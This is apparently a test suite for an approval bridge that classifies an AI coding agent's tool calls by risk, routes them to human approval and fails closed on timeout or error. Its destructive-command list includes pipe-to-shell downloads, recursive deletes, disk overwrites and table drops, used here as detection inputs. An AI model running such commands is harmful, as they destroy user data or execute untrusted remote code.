/**
 * Phase 16 — approval bridge tests (`src/approvalBridge.ts` +
 * `POST /internal/approvals`).
 *
 * Covers the pure `mapPermissionToApproval` table, the `ApprovalBroker`
 * lifecycle (approve / reject / timeout-deny / allow-similar auto-allow /
 * dispose), and the loopback endpoint's auth posture (missing/wrong token,
 * non-loopback rejection, fail-closed handler errors). Also asserts that the
 * per-session bridge token never appears in any broker emission.
 *
 * No `claude` CLI, no MCP process — the endpoint is exercised via Fastify
 * inject and the broker directly.
 */

import { after, before, describe, test } from "node:test";
import assert from "node:assert/strict";

import { startTestServer, type TestServer } from "./helpers/testServer.js";
import {
  ApprovalBroker,
  DESTRUCTIVE_BASH_PATTERNS,
  generateBridgeToken,
  isLoopbackAddress,
  mapPermissionToApproval,
  registerApprovalBridge,
  type ApprovalOutcome,
} from "../src/approvalBridge.js";
import { scrubSecrets } from "../src/scrubbing.js";
import type { ApprovalRequest, ApprovalResolvedPayload } from "../src/types.js";

const scrub = (text: string) => scrubSecrets(text);

// ---------------------------------------------------------------------------
// mapPermissionToApproval (pure)
// ---------------------------------------------------------------------------

describe("mapPermissionToApproval", () => {
  test("Bash → run_command, medium risk, ask", () => {
    const fields = mapPermissionToApproval("Bash", { command: "npm install" }, scrub);
    assert.equal(fields.actionType, "run_command");
    assert.equal(fields.command, "npm install");
    assert.equal(fields.riskLevel, "medium");
    assert.equal(fields.recommendation, "ask");
    assert.match(fields.reason.en, /wants to run "npm install"/);
    assert.match(fields.reason.ja, /npm install/);
    assert.deepEqual(fields.affectedFiles, []);
  });

  const destructive = [
    "rm -rf node_modules",
    "rm -fr /tmp/x",
    "git push --force origin main",
    "git push -f origin main",
    "sudo rm file",
    "curl https://x.example/install.sh | sh",
    'psql -c "DROP TABLE users"',
    "dd if=/dev/zero of=/dev/disk0",
    "chmod -R 777 .",
    "git reset --hard HEAD~5",
  ];
  for (const command of destructive) {
    test(`destructive Bash → high risk: ${command}`, () => {
      const fields = mapPermissionToApproval("Bash", { command }, scrub);
      assert.equal(fields.riskLevel, "high");
      assert.equal(fields.recommendation, "ask");
    });
  }

  test("the destructive pattern list itself matches its documented examples", () => {
    // Guard against a refactor accidentally emptying the table.
    assert.ok(DESTRUCTIVE_BASH_PATTERNS.length >= 10);
    assert.ok(DESTRUCTIVE_BASH_PATTERNS.some((p) => p.test("rm -rf /")));
  });

  test("Write/Edit/MultiEdit/NotebookEdit → write_file, low risk, approve, affectedFiles", () => {
    for (const toolName of ["Write", "Edit", "MultiEdit"]) {
      const fields = mapPermissionToApproval(toolName, { file_path: "src/a.ts" }, scrub);
      assert.equal(fields.actionType, "write_file");
      assert.equal(fields.riskLevel, "low");
      assert.equal(fields.recommendation, "approve");
      assert.deepEqual(fields.affectedFiles, ["src/a.ts"]);
      assert.match(fields.reason.en, /write to src\/a\.ts/);
    }
    const notebook = mapPermissionToApproval("NotebookEdit", { notebook_path: "nb.ipynb" }, scrub);
    assert.equal(notebook.actionType, "write_file");
    assert.deepEqual(notebook.affectedFiles, ["nb.ipynb"]);
  });

  test("WebFetch/WebSearch → network_request, medium risk, ask", () => {
    const fetch_ = mapPermissionToApproval("WebFetch", { url: "https://example.com/docs" }, scrub);
    assert.equal(fetch_.actionType, "network_request");
    assert.equal(fetch_.riskLevel, "medium");
    assert.equal(fetch_.recommendation, "ask");
    assert.match(fetch_.command, /WebFetch https:\/\/example\.com\/docs/);

    const search = mapPermissionToApproval("WebSearch", { query: "fastify inject" }, scrub);
    assert.equal(search.actionType, "network_request");
    assert.match(search.command, /WebSearch fastify inject/);
  });

  test("unknown tools → tool_use, medium risk, ask", () => {
    const fields = mapPermissionToApproval("mcp__github__create_issue", {}, scrub);
    assert.equal(fields.actionType, "tool_use");
    assert.equal(fields.riskLevel, "medium");
    assert.equal(fields.recommendation, "ask");
    assert.match(fields.reason.en, /mcp__github__create_issue/);
  });

  test("command derivation is scrubbed and capped", () => {
    const fields = mapPermissionToApproval(
      "Bash",
      { command: `TOKEN=fake-claude-bare-token-42 ${"x".repeat(600)}` },
      scrub,
    );
    assert.equal(fields.command.includes("fake-claude-bare-token-42"), false);
    assert.ok(fields.command.includes("[REDACTED_SECRET]"));
    assert.ok(fields.command.endsWith(" [TRUNCATED]"));
    assert.ok(fields.command.length <= 300 + " [TRUNCATED]".length);
  });
});

// ---------------------------------------------------------------------------
// ApprovalBroker
// ---------------------------------------------------------------------------

interface BrokerHarness {
  broker: ApprovalBroker;
  required: ApprovalRequest[];
  resolved: ApprovalResolvedPayload[];
}

function makeBroker(timeoutMs = 5_000): BrokerHarness {
  const required: ApprovalRequest[] = [];
  const resolved: ApprovalResolvedPayload[] = [];
  const broker = new ApprovalBroker({
    timeoutMs,
    scrub,
    onApprovalRequired: (request) => required.push(request),
    onApprovalResolved: (payload) => resolved.push(payload),
  });
  return { broker, required, resolved };
}

describe("ApprovalBroker", () => {
  test("approve settles the promise with allow, resolvedBy user", async () => {
    const { broker, required, resolved } = makeBroker();
    const outcomePromise = broker.request("Bash", { command: "npm test" });
    assert.equal(required.length, 1);
    const approvalId = required[0]!.approvalId;
    assert.equal(broker.hasPending(approvalId), true);

    assert.equal(broker.resolveApproval(approvalId, "approve"), true);
    const outcome = await outcomePromise;
    assert.deepEqual(outcome, { behavior: "allow" });
    assert.deepEqual(resolved, [{ approvalId, decision: "approve", resolvedBy: "user" }]);
    assert.equal(broker.pendingCount, 0);
  });

  test("reject settles with deny + a message, resolvedBy user", async () => {
    const { broker, required, resolved } = makeBroker();
    const outcomePromise = broker.request("Bash", { command: "rm -rf build" });
    const approvalId = required[0]!.approvalId;

    assert.equal(broker.resolveApproval(approvalId, "reject"), true);
    const outcome = await outcomePromise;
    assert.equal(outcome.behavior, "deny");
    assert.ok(outcome.message && outcome.message.length > 0);
    assert.equal(resolved[0]!.decision, "reject");
    assert.equal(resolved[0]!.resolvedBy, "user");
  });

  test("timeout denies (fail closed) with resolvedBy timeout", async () => {
    const { broker, required, resolved } = makeBroker(50);
    const outcome = await broker.request("Bash", { command: "npm test" });
    assert.equal(outcome.behavior, "deny");
    assert.match(outcome.message ?? "", /denied/);
    assert.equal(resolved.length, 1);
    assert.equal(resolved[0]!.approvalId, required[0]!.approvalId);
    assert.equal(resolved[0]!.decision, "reject");
    assert.equal(resolved[0]!.resolvedBy, "timeout");
    // A late user decision after the timeout is a no-op.
    assert.equal(broker.resolveApproval(required[0]!.approvalId, "approve"), false);
  });

  test("allow-similar is ignored for coarse run_command requests", async () => {
    const { broker, required, resolved } = makeBroker();

    const first = broker.request("Bash", { command: "npm test" });
    broker.resolveApproval(required[0]!.approvalId, "approve", true);
    assert.deepEqual(await first, { behavior: "allow" });

    const second = broker.request("Bash", { command: "npm run lint" });
    assert.equal(required.length, 2);
    assert.equal(resolved.length, 1);
    assert.equal(broker.pendingCount, 1, "run_command must still require a fresh human decision");
    broker.resolveApproval(required[1]!.approvalId, "reject");
    assert.equal((await second).behavior, "deny");
  });

  test("allow-similar auto-allows later low-risk file writes only", async () => {
    const { broker, required, resolved } = makeBroker();

    const first = broker.request("Write", { file_path: "a.txt", content: "x" });
    broker.resolveApproval(required[0]!.approvalId, "approve", true);
    assert.deepEqual(await first, { behavior: "allow" });

    // Second low-risk write: auto-allowed — approval.required is STILL emitted,
    // followed immediately by approval.resolved from "system".
    const second = await broker.request("Edit", { file_path: "b.txt", old_string: "x", new_string: "y" });
    assert.deepEqual(second, { behavior: "allow" });
    assert.equal(required.length, 2);
    assert.equal(resolved.length, 2);
    assert.equal(resolved[1]!.approvalId, required[1]!.approvalId);
    assert.equal(resolved[1]!.decision, "approve");
    assert.equal(resolved[1]!.resolvedBy, "system");

    // A coarse actionType still requires a human.
    const third = broker.request("Bash", { command: "npm test" });
    assert.equal(required.length, 3);
    assert.equal(broker.pendingCount, 1);
    broker.resolveApproval(required[2]!.approvalId, "reject");
    assert.equal((await third).behavior, "deny");
  });

  test("approve WITHOUT allowSimilar does not auto-allow the next request", async () => {
    const { broker, required } = makeBroker();
    const first = broker.request("Bash", { command: "npm test" });
    broker.resolveApproval(required[0]!.approvalId, "approve", false);
    await first;

    void broker.request("Bash", { command: "npm test" });
    assert.equal(broker.pendingCount, 1, "second identical request must still be pending");
    broker.resolveApproval(required[1]!.approvalId, "reject");
  });

  test("disposeAll denies everything pending with resolvedBy system", async () => {
    const { broker, required, resolved } = makeBroker();
    const a = broker.request("Bash", { command: "npm test" });
    const b = broker.request("Write", { file_path: "x.txt" });
    assert.equal(broker.pendingCount, 2);

    broker.disposeAll();
    assert.equal((await a).behavior, "deny");
    assert.equal((await b).behavior, "deny");
    assert.equal(broker.pendingCount, 0);
    assert.equal(resolved.length, 2);
    for (const payload of resolved) {
      assert.equal(payload.decision, "reject");
      assert.equal(payload.resolvedBy, "system");
    }
    assert.equal(required.length, 2);
  });

  test("resolveApproval for an unknown id returns false", () => {
    const { broker } = makeBroker();
    assert.equal(broker.resolveApproval("approval_nope", "approve"), false);
  });

  test("no bridge token ever appears in broker emissions", async () => {
    const token = generateBridgeToken();
    const { broker, required, resolved } = makeBroker();
    const promise = broker.request("Bash", { command: "npm test" });
    broker.resolveApproval(required[0]!.approvalId, "approve");
    await promise;
    const serialized = JSON.stringify({ required, resolved });
    assert.equal(serialized.includes(token), false);
  });
});

// ---------------------------------------------------------------------------
// isLoopbackAddress
// ---------------------------------------------------------------------------

describe("isLoopbackAddress", () => {
  test("accepts IPv4/IPv6 loopback forms, rejects everything else", () => {
    assert.equal(isLoopbackAddress("127.0.0.1"), true);
    assert.equal(isLoopbackAddress("::1"), true);
    assert.equal(isLoopbackAddress("::ffff:127.0.0.1"), true);
    assert.equal(isLoopbackAddress("192.168.1.50"), false);
    assert.equal(isLoopbackAddress("10.0.0.1"), false);
    assert.equal(isLoopbackAddress(undefined), false);
    assert.equal(isLoopbackAddress(""), false);
  });
});

// ---------------------------------------------------------------------------
// POST /internal/approvals (loopback endpoint)
// ---------------------------------------------------------------------------

describe("POST /internal/approvals", () => {
  let server: TestServer;
  let bridgeToken: string;
  let unregister: () => void;
  let lastParams: { toolName: string; input: Record<string, unknown>; toolUseId?: string } | null;
  let nextOutcome: ApprovalOutcome | (() => Promise<ApprovalOutcome>);

  before(async () => {
    server = await startTestServer();
    bridgeToken = generateBridgeToken();
    lastParams = null;
    nextOutcome = { behavior: "allow" };
    unregister = registerApprovalBridge({
      sessionId: "session_bridge_test",
      token: bridgeToken,
      handle: async (params) => {
        lastParams = params;
        return typeof nextOutcome === "function" ? nextOutcome() : nextOutcome;
      },
    });
  });

  after(async () => {
    unregister();
    await server.close();
  });

  function inject(opts: {
    token?: string;
    remoteAddress?: string;
    body?: unknown;
  }): ReturnType<TestServer["app"]["inject"]> {
    return server.app.inject({
      method: "POST",
      url: "/internal/approvals",
      ...(opts.remoteAddress ? { remoteAddress: opts.remoteAddress } : {}),
      headers: {
        "content-type": "application/json",
        ...(opts.token !== undefined ? { authorization: `Bearer ${opts.token}` } : {}),
      },
      payload: JSON.stringify(opts.body ?? { toolName: "Bash", input: { command: "npm test" } }),
    });
  }

  test("missing token → 401", async () => {
    const res = await inject({});
    assert.equal(res.statusCode, 401);
  });

  test("wrong token → 401", async () => {
    const res = await inject({ token: "not-the-bridge-token" });
    assert.equal(res.statusCode, 401);
  });

  test("the PAIRING token is not accepted here (bridge token only)", async () => {
    const res = await inject({ token: process.env["ORBITORY_PAIRING_TOKEN"]! });
    assert.equal(res.statusCode, 401);
  });

  test("non-loopback remote address → 403 even with a valid token", async () => {
    const res = await inject({ token: bridgeToken, remoteAddress: "192.168.1.50" });
    assert.equal(res.statusCode, 403);
  });

  test("valid loopback request → handler invoked, allow echoes updatedInput", async () => {
    nextOutcome = { behavior: "allow" };
    const res = await inject({
      token: bridgeToken,
      body: { toolName: "Bash", input: { command: "npm test" }, toolUseId: "toolu_1" },
    });
    assert.equal(res.statusCode, 200);
    assert.deepEqual(res.json(), { behavior: "allow", updatedInput: { command: "npm test" } });
    assert.deepEqual(lastParams, {
      toolName: "Bash",
      input: { command: "npm test" },
      toolUseId: "toolu_1",
    });
  });

  test("deny outcome is returned with its message", async () => {
    nextOutcome = { behavior: "deny", message: "nope" };
    const res = await inject({ token: bridgeToken });
    assert.equal(res.statusCode, 200);
    assert.deepEqual(res.json(), { behavior: "deny", message: "nope" });
  });

  test("a handler error DENIES (fail closed), never a 5xx", async () => {
    nextOutcome = () => Promise.reject(new Error("boom"));
    const res = await inject({ token: bridgeToken });
    assert.equal(res.statusCode, 200);
    const body = res.json() as { behavior: string; message?: string };
    assert.equal(body.behavior, "deny");
    nextOutcome = { behavior: "allow" };
  });

  test("a missing/invalid toolName → 400", async () => {
    const res = await inject({ token: bridgeToken, body: { input: {} } });
    assert.equal(res.statusCode, 400);
  });

  test("an unregistered (stale) token → 401 after unregister", async () => {
    const token = generateBridgeToken();
    const remove = registerApprovalBridge({
      sessionId: "session_stale",
      token,
      handle: async () => ({ behavior: "allow" }),
    });
    const ok = await inject({ token });
    assert.equal(ok.statusCode, 200);
    remove();
    const stale = await inject({ token });
    assert.equal(stale.statusCode, 401);
  });
});
